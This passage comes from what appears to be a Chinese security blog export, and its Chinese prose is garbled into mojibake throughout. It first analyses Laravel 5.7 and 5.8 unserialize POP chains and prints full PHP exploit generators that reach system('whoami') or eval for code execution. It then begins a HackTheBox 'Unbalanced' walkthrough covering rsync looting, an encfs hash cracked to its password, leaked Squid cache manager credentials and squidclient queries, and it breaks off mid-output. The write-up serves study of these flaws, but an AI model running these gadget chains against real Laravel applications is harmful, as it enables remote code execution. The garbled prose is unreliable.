è¿™é‡ŒgetMethodDependenciesè¿”å›ä¸¤ä¸ªæ•°ç»„çš„åˆå¹¶æ•°æ®ã€‚ç„¶è€Œå…¶ä¸­$dependenciesæ•°ç»„æ˜¯ä¸ªç©ºçš„ã€‚é‚£ä¹ˆè¿”å›çš„è¿˜æ˜¯æˆ‘ä»¬å¯æ§çš„æ•°ç»„ã€‚æ—¢ç„¶å¦‚æ­¤ã€‚è°ƒç”¨call_user_func_array()çš„è¿™å¥ä»£ç ä¸¤ä¸ªå‚æ•°å°±éƒ½æ˜¯å¯æ§çš„ã€‚å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ã€‚ rce exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpnamespace Illuminate\\Foundation\\Testing&#123; class PendingCommand&#123; public $test; protected $app; protected $command; protected $parameters; public function __construct($test, $app, $command, $parameters) &#123; $this-&gt;test = $test; $this-&gt;app = $app; $this-&gt;command = $command; $this-&gt;parameters = $parameters; &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($default = null) &#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Illuminate\\Foundation&#123; class Application&#123; protected $instances = []; public function __construct($instances = []) &#123; $this-&gt;instances['Illuminate\\Contracts\\Console\\Kernel'] = $instances; &#125; &#125;&#125;namespace&#123; $defaultgenerator = new Faker\\DefaultGenerator(array(\"1\" =&gt; \"1\")); $app = new Illuminate\\Foundation\\Application(); $application = new Illuminate\\Foundation\\Application($app); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, 'system', array('whoami')); echo urlencode(serialize($pendingcommand));&#125; è¿™é‡Œåªéœ€è¦å¢åŠ Applicationç±»çš„å†…å®¹ã€‚è®©å®ƒåœ¨ç¨‹åºæ‰¾å‘$this-&gt;instances[&#39;Illuminate\\Contracts\\Console\\Kernel&#39;]æ‰¾å‘å®ƒè‡ªå·±ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½è°ƒç”¨å®ƒçš„callæ–¹æ³•æ‰§è¡Œcall_user_func_array(&#39;system&#39;,&#39;whoami&#39;)äº†. å°ç»“ä¸€ä¸‹ã€‚5.7çš„popé“¾ä»expçœ‹èµ·æ¥ä¹Ÿå°±ä¸‰ä¸ªç±»çš„äº‹ã€‚ä½†æ˜¯å…¶ä¸­è°ƒè¯•çš„åŠŸå¤«è¦æ±‚æ¯”èµ·thinkphpè¦é«˜å‡ºä¸å°‘ã€‚å…¶ä¸­éå¸¸é‡è¦çš„ä¸€ç‚¹å°±æ˜¯é€šè¿‡åŠ¨æ€è°ƒè¯•æ‰¾åˆ°Kernel::classçš„çœŸæ­£å­—ç¬¦ä¸²å€¼ã€‚å¹¶ä¸€è·¯æ‰¾åˆ°å¯æ§ç‚¹æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ laravel5.8-unserialize5.8å…¶å®ä¹‹å‰åšå›½èµ›é¢˜ç›®æ—¶è·Ÿè¿‡ä¸€æ¬¡äº†ã€‚ä¸è¿‡å°è±¡ä¸å¤ªæ·±åˆ»äº†ã€‚æ‰€ä»¥å†æ¥çœ‹ä¸€æ¬¡ã€‚å…¶ä¸­æœ‰ä¸€æ¡é“¾æ˜¯é symfonyç»„ä»¶åšçš„ã€‚å°±ä¸è·Ÿäº†ã€‚(å®éªŒäº†ä¸‹æœ€æ–°ç‰ˆæœ¬symfonyç»„ä»¶æ²¡æ³•ç”¨äº†) æˆ‘ä¸»è¦çœ‹ä¸ƒæœˆç«å¸ˆå‚…ä»‹ç»çš„ä¸€æ¡é“¾ã€‚æ¥è‡ªpç¥å°å¯†åœˆã€‚ç„¶åè¿˜æœ‰ä¸€æ¡é“¾æ˜¯æ¥è‡ªæŠ¤ç½‘æ¯çš„éé¢„æœŸã€‚è·Ÿç¬¬äº”ç©ºé—´ä¸€ä¸ªæ€§è´¨ã€‚å¦‚æœæ˜¯æŒ‰composerç›´æ¥ä¸‹è½½çš„è¯ã€‚ä¸¤æ¡é“¾éƒ½å¯ä»¥ç”¨ã€‚è¿˜æ˜¯è€æ–¹æ³•æˆ‘ä»¬ç›´æ¥å¢åŠ ååºåˆ—åŒ–è·¯ç”±è·Ÿæ§åˆ¶å™¨ä»£ç ã€‚ å…¥æ‰‹ç‚¹æ˜¯ä¸€ä¸ªè²Œä¼¼åœ¨laravelå¾ˆå¤šé“¾å­ä¸­éƒ½é€šç”¨çš„destruct 1234public function __destruct()&#123; $this-&gt;events-&gt;dispatch($this-&gt;event);&#125; å¾ˆæ˜æ˜¾è¿™é‡Œå°±æœ‰ä¸¤ç§æ€è·¯1.å…¨å±€æ‰¾å­˜åœ¨dispatchçš„æœ‰ç”¨æ–¹æ³•ã€‚2.å…¨å±€æ‰¾__callæ–¹æ³• popchain1å¯¹äºæˆ‘ä¸ªäººè€Œè¨€è¿™é‡Œå¯ä»¥è¯´æ˜¯ç¬¬ä¸€ååº”å°±æƒ³å»æ‰¾__call.å› ä¸ºå¾ˆæ˜æ˜¾çš„åŒå‚æ•°å‡å¯æ§.phpä¸­__callè¿™ç§é­”æœ¯æ–¹æ³•æœ¬æ¥å°±æ˜¯è®¾è®¡å‡ºæ¥ç”¨æ¥åŠ¨æ€è°ƒç”¨çš„ã€‚æ‰€ä»¥è‚¯å®šæœ‰ç±»ä¸­ä½¿ç”¨call_user_funcè¿™æ ·çš„æ–¹å¼è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚æˆ‘ä»¬ä¸éš¾æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„Generatorç±» 12345678910111213141516public function format($formatter, $arguments = array())&#123; return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);&#125;public function __call($method, $attributes)&#123; return $this-&gt;format($method, $attributes);&#125;public function getFormatter($formatter)&#123; if (isset($this-&gt;formatters[$formatter])) &#123; return $this-&gt;formatters[$formatter]; &#125; ...... å…¨éƒ¨å¯æ§ã€‚æ‰€ä»¥æœ€ç»ˆcall_user_funcç›´æ¥å‘½ä»¤æ‰§è¡Œã€‚è¿™ä¸ªçœŸçš„æ˜¯å¤ªç®€å•äº†ã€‚éš¾æ€ªç¬¬5ç©ºé—´ä¼šæ¢äº†__destruct. (ä¹‹å‰å› ä¸ºç¬¬5ç©ºé—´æ‰“çš„å¤ªçƒ‚äº†æ²¡è¿›çº¿ä¸‹å°±æ²¡ä»”ç»†ç ”ç©¶ã€‚ç»“æœä»”ç»†ä¸€çœ‹å‘ç°åŸæ¥å½“æ—¶é‚£ä¸ªæ˜¯5.7çš„ç‰ˆæœ¬å•Šâ€¦â€¦)è¯´èµ·æ¥æŠ¤ç½‘æ¯é‚£é¢˜destructä»£ç è°ƒç”¨çš„æ˜¯$this-&gt;events-&gt;fire($this-&gt;event);ã€‚è²Œä¼¼è·Ÿå®˜æ–¹æºç ä¸ä¸€æ ·ï¼Ÿä½†è¿™æ¡é“¾ååæ˜¯ä¸ªéé¢„æœŸã€‚æœ‰ç‚¹è¿·ã€‚ popchain1 exp 1234567891011121314151617181920212223242526272829303132333435&lt;?phpnamespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($events, $event) &#123; $this-&gt;event = $event; $this-&gt;events = $events; &#125; &#125;&#125;namespace Faker&#123; class Generator &#123; protected $formatters; function __construct($format)&#123; $this-&gt;formatters = $format; &#125; &#125;&#125;namespace&#123; $fs = array(\"dispatch\"=&gt;\"system\"); $gen = new Faker\\Generator($fs); $pb = new Illuminate\\Broadcasting\\PendingBroadcast($gen,\"whoami\"); echo(urlencode(serialize($pb)));&#125; popchain2æ¥è‡ªä¸Šé¢è¿™æ¡é“¾å­çš„å˜æ‹›ã€‚åˆšåˆšè¯´äº†Symphonyæœ€æ–°ç‰ˆæœ¬å·²ç»æ²¡æ³•ç”¨äº†ã€‚å…¶ä¸»è¦åŸå› æ˜¯,ç¦æ­¢å¯¹TagAwareAdapterç±»ååºåˆ—åŒ–ã€‚æ‰€ä»¥åŠ äº†ä¸€ä¸ª__wakeupã€‚æ ¹æœ¬åˆ°ä¸äº†destructé‚£ 123456789public function __wakeup()&#123; throw new \\BadMethodCallException('Cannot unserialize '.__CLASS__);&#125;public function __destruct()&#123; $this-&gt;commit();&#125; ä½†æ˜¯æœ‰Symfonyçš„æƒ…å†µä¸‹è¿˜æ˜¯å¯ä»¥ç”¨å…¶ä»–ç±»ã€‚æ¯”å¦‚æˆ‘ä»¬æœç´¢__destructæ‰¾åˆ°å¾ˆæ˜æ˜¾çš„åŒå‚æ•°å¯æ§è°ƒç”¨ 123456789101112131415161718class ImportConfigurator&#123; use Traits\\HostTrait; use Traits\\PrefixTrait; use Traits\\RouteTrait; private $parent; public function __construct(RouteCollection $parent, RouteCollection $route) &#123; $this-&gt;parent = $parent; $this-&gt;route = $route; &#125; public function __destruct() &#123; $this-&gt;parent-&gt;addCollection($this-&gt;route); &#125; destructæ˜¯ä¸€æ ·çš„å¯æ§å‚æ•°è°ƒç”¨å‡½æ•°ã€‚æ‰€ä»¥æ®Šé€”åŒå½’ã€‚ä¸ä¸Šé¢ä¸€æ ·çš„çš„æ€§è´¨ã€‚expæŠŠdispatchæ”¹ä¸ºaddCollectionå°±è¡Œäº†ã€‚ exp2 12345678910111213141516171819202122232425262728293031&lt;?phpnamespace Symfony\\Component\\Routing\\Loader\\Configurator &#123; class ImportConfigurator&#123; private $parent; private $route; public function __construct( $parent, $route) &#123; $this-&gt;parent = $parent; $this-&gt;route = $route; &#125; &#125;&#125;namespace Faker&#123; class Generator &#123; protected $formatters; function __construct($format)&#123; $this-&gt;formatters = $format; &#125; &#125;&#125;namespace&#123; $fs = array(\"addCollection\"=&gt;\"system\"); $gen = new Faker\\Generator($fs); $pb = new Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator($gen,\"whoami\"); echo(urlencode(serialize($pb)));&#125; è¿™é‡Œä¸éœ€è¦åœ¨æ„ImportConfiguratoråŸæœ¬æ„é€ å‡½æ•°ä¸­ç»§æ‰¿å’Œå®šæ­»çš„ç±»å‹ã€‚å› ä¸ºæ˜¯ç›´æ¥è¿›è¡Œé“¾å¼è°ƒç”¨ã€‚ popchain3å›åˆ°å¼€å§‹ã€‚æˆ‘ä»¬è¯´é™¤äº†ç”¨__callæ‰“ç»„åˆæ‹³ã€‚è¿˜å¯ä»¥æ‰¾æœ‰ç”¨çš„å…¨å±€æ‰¾å­˜åœ¨dispatchæ–¹æ³•ã€‚æ¯”å¦‚src\\Illuminate\\Bus\\Dispatcher.php 1234567891011121314151617181920public function dispatch($command)&#123; if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123; return $this-&gt;dispatchToQueue($command); &#125; return $this-&gt;dispatchNow($command);&#125;protected function commandShouldBeQueued($command)&#123; return $command instanceof ShouldQueue;&#125;public function dispatchToQueue($command)&#123; $connection = $command-&gt;connection ?? null; $queue = call_user_func($this-&gt;queueResolver, $connection); ...... é¦–å…ˆifåˆ¤æ–­é‡Œè°ƒç”¨commandShouldBeQueuedã€‚ç„¶åè°ƒç”¨dispatchToQueue.å¯ä»¥çœ‹åˆ°ã€‚$commandåªè¦æ˜¯å®ç°ShouldQueueæ¥å£çš„ç±»å³å¯è¿›å…¥ä¸‹é¢,å­˜åœ¨call_user_funcçš„å‘½ä»¤è°ƒç”¨ã€‚ ç°åœ¨å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ã€‚é‚£å°±åªéœ€è¦æ‰¾ä¸€ä¸ªå¯ç”¨ç±»å³å¯ã€‚æ¯”å¦‚EvalLoaderã€‚å…¶loadæ–¹æ³•å«æœ‰evalè¯­å¥. 12345678910111213141516171819202122class EvalLoader implements Loader&#123; public function load(MockDefinition $definition) &#123; if (class_exists($definition-&gt;getClassName(), false)) &#123; return; &#125; eval(\"?&gt;\" . $definition-&gt;getCode()); &#125;&#125;public function getClassName()&#123; return $this-&gt;config-&gt;getName();&#125;public function getCode()&#123; return $this-&gt;code;&#125; çœ‹åˆ°åªè¦ä¿è¯$this-&gt;configçš„ç±»å­˜åœ¨getNameæ–¹æ³•ã€‚å°±å¯ä»¥è·³è¿‡returnæ‰§è¡Œeval.è¿™é‡Œé€‰æ‹©PhpParser\\Node\\Scalar\\MagicConst\\Lineç±» exp3 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpnamespace PhpParser\\Node\\Scalar\\MagicConst&#123; class Line &#123;&#125;&#125;namespace Mockery\\Generator&#123; class MockDefinition &#123; protected $config; protected $code; public function __construct($config, $code) &#123; $this-&gt;config = $config; $this-&gt;code = $code; &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher &#123; protected $queueResolver; public function __construct($queueResolver) &#123; $this-&gt;queueResolver = $queueResolver; &#125; &#125;&#125;namespace Illuminate\\Foundation\\Console&#123; class QueuedCommand &#123; public $connection; public function __construct($connection) &#123; $this-&gt;connection = $connection; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($events, $event) &#123; $this-&gt;events = $events; $this-&gt;event = $event; &#125; &#125;&#125;namespace&#123; $line = new PhpParser\\Node\\Scalar\\MagicConst\\Line(); $mockdefinition = new Mockery\\Generator\\MockDefinition($line,'&lt;?php phpinfo();?&gt;'); $evalloader = new Mockery\\Loader\\EvalLoader(); $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evalloader,'load')); $queuedcommand = new Illuminate\\Foundation\\Console\\QueuedCommand($mockdefinition); $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$queuedcommand); echo urlencode(serialize($pendingbroadcast));&#125; summaryæ²’æƒ³åˆ°ä¸€ä¸ªä¸‹åˆèƒ½æŠŠlaravelä¸»è¦çš„ä¸¤ä¸ªç‰ˆæœ¬ååºåˆ—åŒ–è·Ÿå®Œã€‚è¿˜æ˜¯æ”¶è·æŒºå¤§çš„ã€‚ä¸è¿‡å®æˆ˜ä¸­æƒ³é‡åˆ°laravelååºåˆ—åŒ–æ¯”è¾ƒå›°éš¾ã€‚ä½¿ç”¨pharæ¥è¿›è¡Œè§¦å‘åº”è¯¥æ˜¯æ¯”è¾ƒç†æƒ³çš„å¯èƒ½æ–¹å¼ã€‚åˆ°æ­¤phpååºåˆ—åŒ–å°±å‘Šä¸€æ®µè½äº†å§ã€‚å‰©ä¸‹çš„å‡æœŸå°±å¤ä¹ ä¹‹ä½™æŠ½ç©ºçœ‹javaäº†ã€‚","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"}]},{"title":"hackthebox-Unbalanced","slug":"hackthebox-Unbalanced","date":"2020-08-15T08:17:48.000Z","updated":"2021-02-18T05:09:27.449Z","comments":true,"path":"2020/08/15/hackthebox-Unbalanced/","link":"","permalink":"https://www.bycsec.top/2020/08/15/hackthebox-Unbalanced/","excerpt":"Unbalanced å¯èƒ½æ˜¯è‡ªå·±åšè¿‡çš„htbå›°éš¾é¶æœºä¸­é‡Œæœ€ç®€å•çš„ä¸€ä¸ªã€‚å…¶ä¸»è¦éš¾åº¦æ¥è‡ªäºæœ€å¼€å§‹çš„èµ·æ‰‹å¼éƒ¨åˆ†ã€‚æ¯”è¾ƒéœ€è¦è€å¿ƒ,ä½†æ˜¯æ²¡æœ‰éš¾åº¦ã€‚è€Œææƒéƒ¨åˆ†ç›´æ¥å¯ä»¥ç”¨ndayæ‰“ã€‚è¿™å¯¹äºä¸€ä¸ªå›°éš¾é¶æœºè€Œè¨€åŸºæœ¬å¤ªè¿‡ç®€å•äº†ã€‚æ‰€ä»¥åˆ°æ—¶ç®€å•åˆ†æä¸‹è¿™ä¸ªç”¨åˆ°çš„cveã€‚","text":"Unbalanced å¯èƒ½æ˜¯è‡ªå·±åšè¿‡çš„htbå›°éš¾é¶æœºä¸­é‡Œæœ€ç®€å•çš„ä¸€ä¸ªã€‚å…¶ä¸»è¦éš¾åº¦æ¥è‡ªäºæœ€å¼€å§‹çš„èµ·æ‰‹å¼éƒ¨åˆ†ã€‚æ¯”è¾ƒéœ€è¦è€å¿ƒ,ä½†æ˜¯æ²¡æœ‰éš¾åº¦ã€‚è€Œææƒéƒ¨åˆ†ç›´æ¥å¯ä»¥ç”¨ndayæ‰“ã€‚è¿™å¯¹äºä¸€ä¸ªå›°éš¾é¶æœºè€Œè¨€åŸºæœ¬å¤ªè¿‡ç®€å•äº†ã€‚æ‰€ä»¥åˆ°æ—¶ç®€å•åˆ†æä¸‹è¿™ä¸ªç”¨åˆ°çš„cveã€‚ é¶æœº 10.10.10.200 æ”»å‡»æœº 10.10.14.11 initial footholdnmap 123456789101112131415161718# Nmap 7.80 scan initiated Fri Aug 7 11:01:56 2020 as: nmap -sC -sV -oA nmap/unbalance 10.10.10.200Nmap scan report for 10.10.10.200Host is up (0.43s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)| 256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)|_ 256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)873/tcp open rsync (protocol version 31)3128/tcp open http-proxy Squid http proxy 4.6|_http-server-header: squid/4.6|_http-title: ERROR: The requested URL could not be retrievedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Aug 7 11:03:34 2020 -- 1 IP address (1 host up) scanned in 98.87 seconds 873æœ‰rsync.3128æœ‰squidã€‚æ—¢ç„¶rsyncå¼€æ”¾,åœ¨htbè¿™ç§ç¯å¢ƒé‡Œè‚¯å®šå­˜åœ¨æœªæˆæƒè®¿é—®çš„ã€‚æ‰€ä»¥æ¢æµ‹å¹¶ä¸‹è½½ä¸‹æ¥ã€‚ 123root@byc404:~/htb/boxes/Unbalanced/# rsync 10.10.10.200::conf_backups EncFS-encrypted configuration backupsroot@byc404:~/htb/boxes/Unbalanced/# rsync 192.168.122.1::conf_backups ./rsync_backup å¾—åˆ°conf_backupsæ–‡ä»¶å¤¹ã€‚çœ‹ä¸‹å†…å®¹ 1234567891011121314151617root@byc404:~/htb/boxes/Unbalanced/rsync_backup# ls -la-rw-r--r-- 1 root root 2980 Apr 4 23:05 A4qOD1nvqe9JgKnslwk1sUzO -rw-r--r-- 1 root root 1138 Apr 4 23:05 a4zdmLrBYDC24s9Z59y-Pwa2 -rw-r--r-- 1 root root 443 Apr 4 23:05 Acv0PEQX8vs-KdK307QNHaiF -rw-r--r-- 1 root root 935 Apr 4 23:05 B6J5M3OP0X7W25ITnaZX753T -rw-r--r-- 1 root root 3643 Apr 4 23:05 c9w3APbCYWfWLsq7NFOdjQpA -rw-r--r-- 1 root root 288 Apr 4 23:05 ,CBjPJW4EGlcqwZW4nmVqBA6 -rw-r--r-- 1 root root 1521 Apr 4 23:05 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1 -rw-r--r-- 1 root root 332 Apr 4 23:05 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1 -rw-r--r-- 1 root root 2592 Apr 4 23:05 dF2GU58wFl3x5R7aDE6QEnDj -rw-r--r-- 1 root root 1268 Apr 4 23:05 dNTEvgsjgG6lKBr8ev8Dw,p7 -rw-r--r-- 1 root root 2359 Apr 4 23:05 ECXONXBBRwhb5tYOIcjjFZzh -rw-r--r-- 1 root root 1297 Apr 2 21:06 .encfs6.xml -rw-r--r-- 1 root root 1464 Apr 4 23:05 F4F9opY2nhVVnRgiQ,OUs-Y0 -rw-r--r-- 1 root root 354 Apr 4 23:05 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1..... å‘ç°æ–‡ä»¶åä¼¼ä¹éƒ½æ˜¯å¤„ç†è¿‡çš„hashstring.æœ‰ä¸ª.encfs6.xmlä½†æ˜¯å†…å®¹çœ‹ä¸å‡ºä»€ä¹ˆæ•æ„Ÿæ•°æ®ã€‚ googleæœç´¢äº†ä¸‹å‘ç°è¿™æ˜¯encfsåŠ å¯†å¾—åˆ°é…ç½®æ–‡ä»¶ã€‚encfsåŠ å¯†çš„ç”¨æ³•ç®€å•æ¥è¯´,å°±æ˜¯ä½ å¯ä»¥æŒ‡å®šä¸€ä¸ªè¢«åŠ å¯†çš„æ–‡ä»¶å¤¹,å†mountå¦ä¸€ä¸ªæ–‡ä»¶å¤¹ä½œä¸ºåŠ å¯†æ–‡ä»¶å¤¹ã€‚æ‰§è¡Œencfså,è¢«åŠ å¯†çš„æ–‡ä»¶å¤¹çš„å†…å®¹ä»¥åŠæ–‡ä»¶åå°±åœ¨åŠ å¯†æ–‡ä»¶å¤¹å°±ä¼šè‡ªåŠ¨ç”Ÿæˆã€‚æ­¤æ—¶åŠ å¯†æ–‡ä»¶å¤¹ä¼šç•™ä¸‹ä¸€ä¸ª.encfs6.xml è¿™ç§æƒ…å†µç»å¸¸å‡ºç°åœ¨ä½¿ç”¨è‡ªåŠ¨åŒæ­¥çš„æƒ…å†µé‡Œé¢ã€‚å› ä¸ºencfsä¸€æ—¦ä¸ºä¸¤ä¸ªæ–‡ä»¶å¤¹å»ºç«‹äº†æ˜ å°„,å°±ä¼šè‡ªåŠ¨åŠ å¯†æ–°æ”¾å…¥çš„æ–‡ä»¶ã€‚æ­£å› å¦‚æ­¤,ä½¿ç”¨rsyncå¤„ç†encfsåŠ å¯†åçš„æ–‡ä»¶å¤¹ä¹Ÿæ˜¯ä¸€ç§å¸¸è§é€‰æ‹©ã€‚è€Œä¸€æ—¦å‡ºç°äº†rsyncæœªæˆæƒè®¿é—®å°±å°†å¯¼è‡´è¿›ä¸€æ­¥çš„ä¿¡æ¯æ³„éœ²ã€‚å®æˆ˜ä¸­å®Œå…¨å¯èƒ½ã€‚ è‡³äºè§£å¯†æ–¹æ³•å…¶å®å®‰è£…äº†encfsåçœ‹ä¸€ä¸‹manå°±æ‡‚äº†ã€‚æˆ‘åœ¨--reverseçš„é€‰é¡¹é‚£çœ‹åˆ°äº†ä¸€ç§é€†å‘ä¸¤ä¸ªencfsæ–‡ä»¶å¤¹çš„åšæ³•ã€‚å› æ­¤åªéœ€è¦ä¸€ä¸ªæ­£ç¡®çš„encfs å¯†ç å³å¯ã€‚(encfsæ¯æ¬¡è°ƒç”¨åŠ å¯†å»ºç«‹æ˜ å°„æ—¶ä¼šè¦æ±‚ä½ è¾“å…¥å¯†ç )æ¥ç€æŸ¥èµ„æ–™ã€‚æˆ‘å‘ç°encfså¦‚æœæœ‰.encfs6.xmlçš„è¯ã€‚å¯ä»¥ç›´æ¥ä½¿ç”¨johnçˆ†ç ´https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml å…ˆä½¿ç”¨encfs2john.pyè½¬æ¢ã€‚ç„¶åçˆ†ç ´å³å¯ ç»“æœ$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add:bubblegum bubblegumå°±æ˜¯encfså¯†ç ã€‚ç„¶åè§£å¯†æ–‡ä»¶å¤¹ã€‚æŠŠè§£å¯†çš„æ–‡ä»¶å¤¹æ”¾åˆ°rsync_decrypté‡Œå»ã€‚æ³¨æ„è¿™é‡Œçš„è·¯å¾„åªæ¥å—ç»å¯¹è·¯å¾„ã€‚ 1ENCFS6_CONFIG=/root/htb/boxes/Unbalanced/rsync_backup/.encfs6.xml encfs /root/htb/boxes/Unbalanced/rsync_backup /root/htb/boxes/Unbalanced/rsync_decrypt å¾—åˆ°è§£å¯†æ–‡ä»¶å¤¹åã€‚å‘ç°æœ‰å‡ åä¸ªconfæ–‡ä»¶ã€‚åŸºæœ¬å°±æ˜¯å¹³æ—¶ä¼šæ”¾åˆ°/etcä¸‹çš„é‚£äº›.confæ–‡ä»¶ã€‚ è¿™é‡Œæ˜æ˜¾éœ€è¦æŠ“é‡ç‚¹ã€‚åŸºäºä¹‹å‰æˆ‘ä»¬æ¢æµ‹æ—¶å‘ç°æœ‰squidä»£ç†å¼€æ”¾ã€‚æ‰€ä»¥æ‰¾åˆ°squid.confã€‚squid.confåŒæ ·è¦æŠ“é‡ç‚¹ã€‚å› ä¸ºé‡Œé¢æœ‰ä¸Šåƒè¡Œå†…å®¹ã€‚æ¯”è¾ƒæ–¹ä¾¿çš„æ–¹æ³•æ˜¯ç›´æ¥cat squid.conf| grep htbæ‰¾åˆ°ä¸€ä¸ªåŸŸåã€‚æˆ–è€…åæ¥æˆ‘æ‹¿åˆ°æœ¬æœºä¸Šç”¨vscodeçœ‹æ—¶å› ä¸ºæ³¨é‡Šéƒ¨åˆ†è·Ÿæœªæ³¨é‡Šéƒ¨åˆ†æœ‰æ˜æ˜¾çš„ç»¿è‰²ä¸ç™½è‰²å·®åˆ«ã€‚æ‰€ä»¥å¯ä»¥å¾ˆå¿«æ‹–ç€çœ‹ã€‚æ‰¾åˆ°æ‰€æœ‰å…³é”®ä¿¡æ¯ã€‚ 123456789101112131415161718192021222324# Only allow cachemgr access from localhost#http_access allow localhost manager#http_access deny managerhttp_access allow manager#http_access allow localnethttp_access allow localhost# Allow access to intranetacl intranet dstdomain -n intranet.unbalanced.htbacl intranet_net dst -n 172.16.0.0&#x2F;12http_access allow intranethttp_access allow intranet_net# cachemgr_passwd secret shutdown# cachemgr_passwd lesssssssecret info stats&#x2F;objects# cachemgr_passwd disable all#Default:# No password. Actions which require password are denied.cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf eventscachemgr_passwd disable all å‡ ä¸ªå…³é”®ç‚¹ã€‚ intranet.unbalanced.htb åŸŸåã€‚ä¸è¿‡æ˜¯å†…ç½‘ip cachemgr_passwd å³cache managerçš„å¯†ç Thah$Sh1 åªèƒ½æœ¬åœ°è®¿é—® é‚£å°±å¾ˆæ˜æ˜¾äº†ã€‚æˆ‘ä»¬ä¹‹å‰nampä¹Ÿæ²¡æœ‰æ‰¾åˆ°squidä»¥å¤–çš„webæœåŠ¡ã€‚æ—¢ç„¶å¦‚æ­¤,ç›´æ¥ä½¿ç”¨å®ƒè¿™ä¸ªä»£ç†æœåŠ¡å™¨ä½œä»£ç†å°±èƒ½è®¿é—®å†…ç½‘ç½‘é¡µäº†ã€‚ ä¿®æ”¹æµè§ˆå™¨çš„ä»£ç†æ”¹ä¸º10.10.10.200:3128.å†æ¬¡è®¿é—®intranet.unbalanced.htb ç°åœ¨æˆ‘ä»¬å¯ä»¥è®¿é—®åˆ°é¡µé¢.å®ƒä¼šé‡å®šå‘æˆ‘ä»¬åˆ°/inranet.phpã€‚ä¸è¿‡è¿™ä¸ªç™»å½•ç•Œé¢æ²¡å•¥ä¸œè¥¿ã€‚å¯èƒ½éœ€è¦è¿›ä¸€æ­¥åˆ©ç”¨ã€‚å”¯ä¸€ç¨å¾®æ³„éœ²å‡ºç›¸å…³ä¿¡æ¯çš„å†…å®¹åœ¨headersé‡Œ è¿™æ—¶æƒ³èµ·æˆ‘ä»¬ä¹‹å‰çš„cache managerå¯†ç ã€‚æœç´¢ä¸€æ³¢å¦‚ä½•åˆ©ç”¨ã€‚ The cache manager (cachemgr.cgi) is a CGI utility for displaying statistics about the squid process as it runs ç®€å•çœ‹ä¸‹å‘ç°æˆ‘ä»¬æ˜¯å¯ä»¥è°ƒç”¨cachemgrçš„å‘½ä»¤çš„ã€‚ä¹‹å‰åœ¨squid.confä¸­è·Ÿåœ¨å¯†ç åçš„ä¸€å¤§ç»„æ–‡å­—å…¶å®å°±æ˜¯å„ç§å¯è°ƒç”¨çš„å‘½ä»¤ã€‚æœç´¢äº†ä¸‹è°ƒç”¨æ–¹å¼ã€‚å‘ç°å¯ä»¥telnetè¿æ¥ä»£ç†æœåŠ¡å™¨ç„¶åå†ä¼ ä¸€ä¸ªhttpæŠ¥å¤´ã€‚ä¸è¿‡åæ¥æ‰¾åˆ°ä¸€ä¸ªdebianå°±æœ‰çš„squidclientå‘½ä»¤è¡Œ.æ›´åŠ æ–¹ä¾¿ã€‚æˆ‘ä»¬å…ˆè°ƒç”¨ä¸‹menuå‘½ä»¤ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768 root@byc404:~/htb/boxes/Unbalanced# squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:menu HTTP/1.1 200 OK Server: squid/4.6 Mime-Version: 1.0 Date: Sat, 15 Aug 2020 02:17:42 GMT Content-Type: text/plain;charset=utf-8 Expires: Sat, 15 Aug 2020 02:17:42 GMT Last-Modified: Sat, 15 Aug 2020 02:17:42 GMT X-Cache: MISS from unbalanced X-Cache-Lookup: MISS from unbalanced:3128 Via: 1.1 unbalanced (squid/4.6) Connection: close index Cache Manager Interface disabled menu Cache Manager Menu protected offline_toggle Toggle offline_mode setting disabled shutdown Shut Down the Squid Process disabled reconfigure Reconfigure Squid disabled rotate Rotate Squid Logs disabled pconn Persistent Connection Utilization Histograms protected mem Memory Utilization protected diskd DISKD Stats protected squidaio_counts Async IO Function Counters disabled config Current Squid Configuration disabled client_list Cache Client List disabled comm_epoll_incoming 